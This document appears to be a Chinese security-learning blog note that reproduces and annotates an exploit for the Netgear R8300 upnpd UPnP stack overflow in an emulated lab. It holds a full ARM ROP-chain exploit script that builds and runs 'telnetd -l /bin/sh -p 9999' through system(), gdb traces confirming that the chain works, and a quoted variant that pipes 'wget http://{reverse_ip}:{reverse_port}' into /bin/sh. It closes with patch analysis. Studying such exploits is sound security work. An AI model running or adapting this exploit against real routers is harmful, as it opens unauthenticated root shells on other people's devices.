ROP可绕过ASLR：ret2libc属于狭义上的ROP，要跳到libc中，直接执行其中的system函数，而广义上的ROP，既可用libc中的指令，又可用自己程序本身的指令，比如BL system，这里说的ROP即用自己指令的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># strcpy存在00截断，会阻止ROP：通过checksec查看upnpd，发现加载基址0x8000，故.text段地址的最高字节均为\x00，因此构造的rop chain一定会包含00，所以与strcpy不允许出现00相矛盾</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 通过stack reuse可绕过上述限制：</span></span><br><span class="line"><span class="comment"># 一般像这种 ROP 的 payload 中包含 \x00，覆盖返回地址的payload 又不能包含 \x00，就要想办法提前将 ROP payload 注入目标内存</span></span><br><span class="line"></span><br><span class="line">We will <span class="keyword">do</span> this by combining two payloads, the composition of first payload is as follows:</span><br><span class="line">    s.send(<span class="string">'a\x00'</span>+expayload) <span class="comment">#expayload is rop gadget</span></span><br><span class="line">We will be sending a “a\x00” value at the beginning of the payload to avoid triggering the UPNP vulnerability, until our payload is <span class="keyword">in</span> the the stack.</span><br><span class="line">The second payload will control the PC value and change it to 0x230f0 and trigger the first payload <span class="keyword">in</span> the stack. 0x230f0 gadget can control stack pointer.</span><br><span class="line">    .text:000230F0                 ADD             SP, SP, <span class="comment">#0x20C</span></span><br><span class="line">    .text:000230F4                 ADD             SP, SP, <span class="comment">#0x1000</span></span><br><span class="line">    .text:000230F8                 LDMFD           SP!, &#123;R4-R11,PC&#125;</span><br><span class="line">We decided to use the BSS area of 0x9E150 to place our strings that we will later use <span class="keyword">for</span> exploitation. Using strcpy gadget 0x13648 and string gadget <span class="keyword">in</span> the binary, we can create the exploiting payload and execute system gadget 0x1A83C.</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 第一次send，发送00+expayload，00防止触发strcpy的溢出漏洞，expayload中是rop gadget（调用strcpy将二进制中字符串gadget拷贝到bss中，来拼接出command字符串，随后调用system执行command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 第二次send，发送payload，通过溢出控制pc为0x230F0，此gadget能控制栈帧，从而找到第一次send的expayload，进而执行expayload中的rop chain（strcpy拼接command字符串、system执行command）</span></span><br></pre></td></tr></table></figure>
<h3 id="exp注解"><a href="#exp注解" class="headerlink" title="exp注解"></a>exp注解</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 &lt;小端、L unsigned long </span></span><br><span class="line">p32 = lambda x: pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 通过replace方法（不同于payload=a+b方法）</span></span><br><span class="line"><span class="comment"># payload中控制pc到此gadget：add sp找到第一次的expayload在栈中位置、LDMFD来控制pc到下一gadget</span></span><br><span class="line">payload = <span class="string">'xxxxxx'</span><span class="comment"># 大量字符</span></span><br><span class="line">expayload = <span class="string">''</span></span><br><span class="line">payload = payload.replace(<span class="string">'z3Bz'</span>,<span class="string">'\x70\x62\xdf\x76'</span>) <span class="comment"># 有效的地址，因为在return前，strstr函数会*p解引用</span></span><br><span class="line">payload = payload.replace(<span class="string">' AAA '</span>,<span class="string">'\xf0\x30\x02\x00'</span>) <span class="comment"># 控制的pc</span></span><br><span class="line"><span class="comment"># .text:000230F0                 ADD             SP, SP, #0x20C</span></span><br><span class="line"><span class="comment"># .text:000230F4                 ADD             SP, SP, #0x1000</span></span><br><span class="line"><span class="comment"># .text:000230F8                 LDMFD           SP!, &#123;R4-R11,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 strcpy的dst，保存拼接后的command字符串</span></span><br><span class="line">bssBase = 0x9E150   <span class="comment">#string bss BASE Address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 dst为bss，src为程序中的string gadget</span></span><br><span class="line">expayload += <span class="string">'a'</span> * 4550</span><br><span class="line">expayload += p32(bssBase+3) <span class="comment"># R4 Register</span></span><br><span class="line">expayload += p32(0x3F340) <span class="comment"># R5 Register //tel</span></span><br><span class="line">expayload += <span class="string">'IIII'</span> <span class="comment"># R6 Register</span></span><br><span class="line">expayload += <span class="string">'HHHH'</span> <span class="comment"># R7 Register</span></span><br><span class="line">expayload += <span class="string">'GGGG'</span> <span class="comment"># R8 Register</span></span><br><span class="line">expayload += <span class="string">'FFFF'</span> <span class="comment"># R9 Register</span></span><br><span class="line">expayload += p32(bssBase) <span class="comment"># R10 Register</span></span><br><span class="line">expayload += <span class="string">'BBBB'</span> <span class="comment"># R11 Register</span></span><br><span class="line">expayload += p32(0x13644) <span class="comment"># strcpy</span></span><br><span class="line"><span class="comment"># .text:00013644                 MOV             R0, R10 ; dest</span></span><br><span class="line"><span class="comment"># .text:00013648                 MOV             R1, R5  ; src</span></span><br><span class="line"><span class="comment"># .text:0001364C                 BL              strcpy</span></span><br><span class="line"><span class="comment"># .text:00013650                 MOV             R0, R4</span></span><br><span class="line"><span class="comment"># .text:00013654                 ADD             SP, SP, #0x5C</span></span><br><span class="line"><span class="comment"># .text:00013658                 LDMFD           SP!, &#123;R4-R8,R10,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 只指定src就可了，dst还是之前的bss，因此跳到0x13648，无需设置r0了</span></span><br><span class="line">expayload += <span class="string">'d'</span>*0x5c<span class="comment">#dummy</span></span><br><span class="line">expayload += p32(bssBase+6) <span class="comment">#R4</span></span><br><span class="line">expayload += p32(0x423D7) <span class="comment">#R5  //telnet</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R6</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R7</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R8 </span></span><br><span class="line">expayload += <span class="string">'d'</span>*4 <span class="comment">#R10</span></span><br><span class="line">expayload += p32(0x13648) <span class="comment">#strcpy</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 command字符串拼接完后，执行system，r4保存bss即command字符串，随后赋值给r0</span></span><br><span class="line"><span class="comment"># .text:0001A83C                 MOV             R0, R4  ; command</span></span><br><span class="line"><span class="comment"># .text:0001A840                 BL              system</span></span><br><span class="line">expayload += <span class="string">'d'</span>*0x5c<span class="comment">#dummy</span></span><br><span class="line">expayload += p32(bssBase) <span class="comment">#R4</span></span><br><span class="line">expayload += p32(0x47398) <span class="comment">#R5 </span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R6</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R7</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R8</span></span><br><span class="line">expayload += <span class="string">'d'</span>*4 <span class="comment">#R10</span></span><br><span class="line">expayload += p32(0x1A83C) <span class="comment">#system(string) telnetd -l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 send两次，第一次保存expayload（rop chain）到栈，第二次溢出控制pc，从而执行第一次的rop chain</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, 1900))</span><br><span class="line">s.send(<span class="string">'a\x00'</span>+expayload)<span class="comment">#expayload is rop gadget </span></span><br><span class="line">s.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8 检查某端口是否开启，若无异常即成功</span></span><br><span class="line">def checkExploit():</span><br><span class="line">    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        ret = soc.connect((<span class="string">'192.168.1.2'</span>,9999))</span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">return</span> 0</span><br></pre></td></tr></table></figure>
<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 exp中payload控制pc为0x000230F0，提前下断</span></span><br><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ gdb-multiarch usr/sbin/upnpd</span><br><span class="line">gef➤  <span class="built_in">set</span> sysroot .</span><br><span class="line">gef➤  target remote 192.168.1.2:1234</span><br><span class="line">0x76d6a4c8 <span class="keyword">in</span> select () from ./lib/libc.so.0</span><br><span class="line">gef➤  b *0x000230F0</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="comment"># 2 exp后成功断下</span></span><br><span class="line"> →    0x230f0                  add    sp,  sp,  <span class="comment">#524	; 0x20c</span></span><br><span class="line">      0x230f4                  add    sp,  sp,  <span class="comment">#4096	; 0x1000</span></span><br><span class="line">      0x230f8                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line">Breakpoint 1, 0x000230f0 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 3 接连ni，通过pop控制pc为0x13644</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x000230f8  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x230f0                  add    sp,  sp,  <span class="comment">#524	; 0x20c</span></span><br><span class="line">      0x230f4                  add    sp,  sp,  <span class="comment">#4096	; 0x1000</span></span><br><span class="line"> →    0x230f8                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line">   ↳     0x13644                  mov    r0,  r10</span><br><span class="line">         0x13648                  mov    r1,  r5</span><br><span class="line">         0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">         0x13650                  mov    r0,  r4</span><br><span class="line">         0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">         0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">         </span><br><span class="line">0x000230f8 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 4 通过strcpy拼接命令字符串到bss的0x9e150</span></span><br><span class="line"><span class="variable">$r0</span>  : 0x0009e150  →  0x00000000</span><br><span class="line"><span class="variable">$r1</span>  : 0x0003f340  →  <span class="string">"telec_dfs_ch_enable"</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x0001364c  →   bl 0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">      0x13644                  mov    r0,  r10</span><br><span class="line">      0x13648                  mov    r1,  r5</span><br><span class="line"> →    0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">0x0001364c <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 5 注意，当lr=pc时，ni会跑飞，在下条指令下断可避免（为何这样就会跑飞，原理未知</span></span><br><span class="line"><span class="variable">$lr</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"><span class="variable">$pc</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"></span><br><span class="line">      0x13644                  mov    r0,  r10</span><br><span class="line">      0x13648                  mov    r1,  r5</span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"> →    0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">      0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">      </span><br><span class="line">0x00013650 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤  b *0x13654</span><br><span class="line">Breakpoint 2 at 0x13654</span><br><span class="line">gef➤  ni</span><br><span class="line"><span class="comment"># 6 同上，继续通过pop控制pc，此次为0x13648，光修改src，dst还是之前bss中的0x9e150</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x00013658  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">      0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line"> →    0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">   ↳     0x13648                  mov    r1,  r5</span><br><span class="line">         0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">         0x13650                  mov    r0,  r4</span><br><span class="line">         0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">         0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">         </span><br><span class="line">0x00013658 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 7 pop+strcpy，循环多次，直至拼接出完整的命令字符串</span></span><br><span class="line">    <span class="comment"># 0x13648                  mov    r1,  r5</span></span><br><span class="line">    <span class="comment"># 0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span></span><br><span class="line">    <span class="comment"># 0x13650                  mov    r0,  r4</span></span><br><span class="line">    <span class="comment"># 0x13654                  add    sp,  sp,  #92	; 0x5c</span></span><br><span class="line">    <span class="comment"># 0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span></span><br><span class="line"><span class="comment"># 8 查看src，即bss中0x9e150，其存放strcpy拼接后的命令字符串（display命令可让其每次都显示</span></span><br><span class="line">gef➤  display/s 0x9e150</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -lan_mac"</span></span><br><span class="line"><span class="comment"># 9 节省时间，不用ni而c（要事先下断），看命令字符串的变化</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l   &lt;m:"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/uptime &gt; /tmp/time_tmp"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p %s -f %s -s /%s/%s/%s -d %s -h 1 &amp;"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 99"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999 &amp; b"</span></span><br><span class="line">gef➤  ni</span><br><span class="line">0x00013650 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999 &amp; "</span></span><br><span class="line"><span class="comment"># 10 命令字符串拼接完成后，pop控制pc为0x1a83c，去执行system函数</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x00013658  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">      0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line"> →    0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">   ↳     0x1a83c                  mov    r0,  r4</span><br><span class="line">         0x1a840                  bl     0xaaac &lt;system@plt&gt;</span><br><span class="line">0x00013658 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 11 执行system，此时r0即前面拼接好的命令字符串</span></span><br><span class="line"><span class="variable">$r0</span>  : 0x0009e150  →  <span class="string">"telnetd -l /bin/sh -p 9999 &amp; "</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x0001a840  →   bl 0xaaac &lt;system@plt&gt;</span><br><span class="line"></span><br><span class="line">      0x1a83c                  mov    r0,  r4</span><br><span class="line"> →    0x1a840                  bl     0xaaac &lt;system@plt&gt;</span><br><span class="line"></span><br><span class="line">0x0001a840 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 12 放行，程序崩溃</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"><span class="comment"># 13 upnpd日志中出现system信息，而且ps后发现已启动，exp执行成功</span></span><br><span class="line">[0x0001a844] system(<span class="string">'telnetd -l /bin/sh -p 9999 &amp; '</span>) = 0<span class="comment"># 日志</span></span><br><span class="line">4237 0          1884 S   telnetd -l /bin/sh -p 9999 <span class="comment"># ps</span></span><br></pre></td></tr></table></figure>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li>bss段：C语言的全局变量如果在代码中没有初始化，就会在程序加载时用0初始化。这种数据属于.bss段，在加载时它和.data段一样都是可读可写的数据，但是在ELF文件中.data段需要 占用一部分空间保存初始值，而.bss 段则不需要。也就是说，.bss 段在文件中只占一个Section Header而没有对应的Section，程序加载时.bss段占多大内存空间在Section Header中描述</li>
<li>stack reuse为什么可行？<ul>
<li>局部变量的存储空间在每次函数调用时分配，在函数返回时释放</li>
<li>call_recvfrom函数中，通过recvfrom函数将接收的socket数据保存在call_recvfrom函数栈上的局部变量中，其没有初始化，故局部变量的值是不确定的，第一次send将expayload保存到局部变量中，此时会调用一次call_recvfrom函数，第二次send真正的payload，又会调用一次call_recvfrom函数，而“局部变量的存储空间在每次函数调用时分配，在函数返回时释放”，怎么来保证第二次send时，局部变量还保存着第一次send时的expayload？？？</li>
<li>//here</li>
</ul>
</li>
<li>exp效果</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp成功，开启了telnet</span></span><br><span class="line">4116 0          1896 S   telnetd -l /bin/sh -p 9999</span><br><span class="line"><span class="comment"># 能连上，但很快断，应该是模拟的问题</span></span><br><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ telnet 192.168.1.2 9999</span><br><span class="line">Trying 192.168.1.2...</span><br><span class="line">Connected to 192.168.1.2.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>
<ul>
<li>rop chain的构造，勉强能看懂，自己实践有点难，多积累//here</li>
</ul>
<h2 id="fenix"><a href="#fenix" class="headerlink" title="fenix"></a>fenix</h2><p><a href="https://paper.seebug.org/1311/#8" target="_blank" rel="noopener">https://paper.seebug.org/1311/#8</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">显然，R4 - R11 也是可控的，思考一下目前的情况：</span><br><span class="line">    1. 开了 NX 不能用 shellcode。</span><br><span class="line">    2. 有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget。</span><br><span class="line">    3. strcpy() 函数导致的溢出，payload 中不能包含 \x00 字符。</span><br><span class="line"></span><br><span class="line">其实可控 PC 后已经可以干很多事了，upnpd 内包含大量 system 函数调用，比如 reboot。</span><br><span class="line"></span><br><span class="line">下面探讨下更为 general 的 RCE 利用，一般像这种 ROP 的 payload 中包含 \x00，覆盖返回地址的payload 又不能包含 \x00，就要想办法提前将 ROP payload 注入目标内存。</span><br><span class="line"></span><br><span class="line">比如，利用内存未初始化问题，构造如下 PoC，每个 payload 前添加 \x00 防止程序崩溃。</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.2.2'</span>, 1900))</span><br><span class="line">s.send(b<span class="string">'\x00'</span> + b<span class="string">'A'</span> * 0x1ff0)</span><br><span class="line">s.send(b<span class="string">'\x00'</span> + b<span class="string">'B'</span> * 0x633)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">在漏洞点下断点，</span><br><span class="line">两次拷贝完成后，看下内存布局：</span><br><span class="line">可以看到，由于接收 socket 数据的 buffer 未初始化，在劫持 PC 前我们可以往目标内存注入 6500 多字节的数据。 这么大的空间，也足以给 ROP 的 payload 一片容身之地。</span><br><span class="line"></span><br><span class="line">关于 ROP，使用 strcpy 调用在 bss 上拼接出命令字符串，并调整 R0 指向这段内存，然后跳转 system 执行即可。</span><br><span class="line"></span><br><span class="line">原作者构造的 system(<span class="string">"telnetd -l /bin/sh -p 9999&amp; "</span>) 绑定型 shell。</span><br><span class="line"></span><br><span class="line">经过分析，我发现可以构造 system(<span class="string">"wget http://&#123;reverse_ip&#125;:&#123;reverse_port&#125; -O-|/bin/sh"</span>) 调用，从而无限制任意命令执行。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定型shell：telnetd -l /bin/sh -p 9999&amp;</span></span><br><span class="line"><span class="comment"># 无限制任意命令执行：wget http://&#123;reverse_ip&#125;:&#123;reverse_port&#125; -O-|/bin/sh，怎么用？</span></span><br><span class="line">mac下：</span><br><span class="line">lxl@192  ~/Desktop  nc -lvn 4444</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">User-Agent: Wget/1.19.4 (linux-gnu)</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: 192.168.142.1:4444</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">Ubuntu下：</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ wget http://192.168.142.1:4444 -O-|/bin/sh</span><br><span class="line">--2020-11-20 16:37:57--  http://192.168.142.1:4444/</span><br><span class="line">Connecting to 192.168.142.1:4444... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9</span><br><span class="line">Length: unspecified</span><br><span class="line">Saving to: ‘STDOUT’</span><br><span class="line"></span><br><span class="line">-  [&lt;=&gt;                    ]       0  --.-KB/s               /home/lxl/Desktop/8</span><br><span class="line"><span class="comment"># 一直在等，不知道怎么用，怎么个无限制法，与telnet相比有何优势？//here</span></span><br></pre></td></tr></table></figure>
<h2 id="cq"><a href="#cq" class="headerlink" title="cq"></a>cq</h2><p><a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</a></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004937.jpg" alt="image-20201120170623224"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">upnpd程序启用的缓解措施如下，可以看到仅启用了NX机制。另外，由于程序的加载基址为0x8000，故.text段地址的最高字节均为\x00，而在调用strcpy()时存在NULL字符截断的问题，因此在进行漏洞利用时需要想办法绕过NULL字符限制的问题。</span><br><span class="line"> checksec --file ./upnpd</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line">    </span><br><span class="line">SSD公开的漏洞细节中给出了一个方案：通过stack reuse的方式来绕过该限制。具体思路为，先通过socket发送第一次数据，往栈上填充相应的rop payload，同时保证不会造成程序崩溃；再通过socket发送第二次数据用于覆盖栈上的返回地址，填充的返回地址用来实现stack pivot，即劫持栈指针使其指向第一次发送的payload处，然后再复用之前的payload以完成漏洞利用。SSD公开的漏洞细节中的示意图如下。</span><br><span class="line"></span><br><span class="line">实际上，由于recvfrom()函数与漏洞点strcpy()之间的路径比较短，栈上的数据不会发生太大变化，利用stack reuse的思路，只需发送一次数据即可完成利用，示意图如下。在调用ssdp_http_method_check()前，接收的socket数据包保存在upnp_main()函数内的局部缓冲区上，而在ssdp_http_method_check()内，当调用完strcpy()后，会复制一部分数据到该函数内的局部缓冲区上。通过覆盖栈上的返回地址，可劫持栈指针，使其指向upnp_main()函数内的局部缓冲区，复用填充的rop gadgets，从而完成漏洞利用。</span><br><span class="line"></span><br><span class="line">另外在调用strcpy()后，在(4)处还调用了函数sub_B60C()。通过对应的汇编代码可知，在覆盖栈上的返回地址之前，也会覆盖R7指向的栈空间内容，之后R7作为参数传递给sub_B60C()。而在sub_B60C()中，会读取R0指向的栈空间中的内容，然后再将其作为参数传递给strstr()，这意味[R0]中的值必须为一个有效的地址。因此在覆盖返回地址的同时，还需要用一个有效的地址来填充对应的栈偏移处，保证函数在返回前不会出现崩溃。由于libc库对应的加载基址比较大，即其最高字节不为\x00，因此任意选取该范围内的一个不包含\x00的有效地址即可。</span><br><span class="line"></span><br><span class="line">在解决了NULL字符截断的问题之后，剩下的部分就是寻找rop gadgets来完成漏洞利用了，相对比较简单。同样，SSD公开的漏洞细节中也包含了完整的漏洞利用代码，其思路是通过调用strcpy gadget拼接出待执行的命令，并将其写到某个bss地址处，然后再调用system gadget执行对应的命令。</span><br><span class="line"></span><br><span class="line">在给出的漏洞利用代码中，strcpy gadget执行的过程相对比较繁琐，经过分析后，在upnpd程序中找到了另一个更优雅的strcpy gadget，如下。借助该gadget，可以直接在数据包中发送待执行的命令，而无需进行命令拼接。</span><br><span class="line"></span><br><span class="line">.text:0000B764 MOV             R0, R4  ; dest</span><br><span class="line">.text:0000B768 MOV             R1, SP  ; src</span><br><span class="line">.text:0000B76C BL              strcpy</span><br><span class="line">.text:0000B770 ADD             SP, SP, <span class="comment">#0x400</span></span><br><span class="line">.text:0000B774 LDMFD           SP!, &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>fenix</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">signed int __fastcall sub_25B88(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-Ch]</span><br><span class="line">  int s; // [sp+600h] [bp+5D0h]</span><br><span class="line">  int *v51; // [sp+628h] [bp+5F8h]</span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  memset(&amp;v40, 0, 0x5DCu);</span><br><span class="line">  v51 = &amp;v40;</span><br><span class="line">  strncpy((char *)&amp;v40, v3, 0x5DBu);</span><br><span class="line"></span><br><span class="line">在更新版固件 V1.0.2.134 中，用 strncpy() 代替 strcpy()，限制了拷贝长度为 0x5db，正好是 buffer 长度减 1。</span><br><span class="line"></span><br><span class="line">补丁中还特意用 memset() 初始化了 buffer。</span><br><span class="line">	这是由于 strncpy() 在拷贝时，如果 n &lt; src 的长度，只是将 src 的前 n 个字符复制到 dest 的前 n 个字符，不会自动添加 \x00，也就是结果 dest 不包括 \x00，需要再手动添加一个 \x00；</span><br><span class="line">	如果 src 的长度小于 n 个字节，则以\x00 填充 dest 直到复制完 n 个字节。</span><br><span class="line"></span><br><span class="line">结合上面的 RCE 利用过程，可见申请内存之后及时初始化是个很好的编码习惯，也能一定程度上避免很多安全问题。</span><br><span class="line"><span class="comment"># v40大小为0x5DC，memset时全部设为0</span></span><br><span class="line"><span class="comment"># strncpy时，限定大小为0x5DB，若src&gt;n，则会占满前0x5DB个位置，其不会自动添加0，但是前面memset时提前设为0了，所以就算src&gt;n,总是能保证最后一个是00</span></span><br></pre></td></tr></table></figure>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p>注意</p>
<ul>
<li>scp向qemu虚拟机传输squashfs-root时，一定要打包打包打包，万无一失</li>
<li>/usr/sbin/upnpd执行后没有任何反应，没有报错信息没发定位，用sh脚本调试失败，换qemu-arm-static，用–strace选项</li>
</ul>
</li>
<li><p>gdb安装gef插件（可高亮</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget http://gef.blah.cat/sh -O -)</span>"</span></span><br><span class="line">cat ~/.gdbinit</span><br><span class="line">	<span class="built_in">source</span> /home/lxl/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/，函数名是怎么识别出来的ssdp_http_method_check()" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/，函数名是怎么识别出来的ssdp_http_method_check()</a></li>
<li>怎么获取有效地址，不会变的？（用libc中的system函数地址，其他也行</li>
<li>lr=pc时，ni跑飞</li>
</ul>
